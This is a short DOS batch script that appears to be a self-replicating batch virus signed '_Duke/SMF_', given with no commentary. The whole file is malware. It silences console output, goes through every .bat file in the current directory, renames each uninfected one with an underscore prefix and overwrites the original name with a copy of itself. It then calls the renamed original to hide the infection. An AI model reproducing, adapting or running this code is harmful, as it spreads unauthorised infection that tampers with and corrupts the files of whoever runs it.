@ctty nul
if "%1=="$ goto $z
set p=_
for %%b in (*.bat) do call %0 $ %%b
ctty con
@call %p%%0
@exit
:$z
find "_"<%2>nul
if not errorlevel 1 goto end
echo.>>%2
echo>>%2 @rem _Duke/SMF_
ren %2 %p%%2
copy %0 %2
:end